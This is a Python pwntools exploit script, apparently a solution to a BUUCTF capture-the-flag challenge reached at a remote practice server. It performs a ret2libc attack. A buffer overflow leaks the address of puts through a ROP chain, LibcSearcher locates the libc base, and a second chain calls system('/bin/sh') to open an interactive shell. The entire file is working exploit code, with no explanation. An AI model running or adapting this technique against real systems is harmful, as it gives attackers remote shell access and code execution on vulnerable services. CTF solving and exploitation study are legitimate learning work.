from pwn import *
from LibcSearcher import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 25743)
elf = ELF('./pwn')
# libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.33.so')

poprdi_ret = 0x400c83

payload = b'\x00' + cyclic(0x50+7)
payload += p64(poprdi_ret)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols[b'main'])

io.sendlineafter(b'Input your choice!', b'1')
io.sendlineafter(b'Input your Plaintext to be encrypted\n', payload)
print(io.recv(12))

put_addr = u64(io.recv(6) + b'\x00\x00')
print(hex(put_addr))
libc = LibcSearcher('puts', put_addr)
libc_base = put_addr - libc.dump('puts')
sys_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')

print(hex(sys_addr))
print(hex(binsh_addr))

payload = b'\x00' + cyclic(0x50+7)
payload += p64(0x4006b9)	# ret
payload += p64(poprdi_ret)
payload += p64(binsh_addr)
payload += p64(sys_addr)

io.sendlineafter(b'Input your choice!', b'1')
io.sendlineafter(b'Input your Plaintext to be encrypted\n', payload)

io.interactive()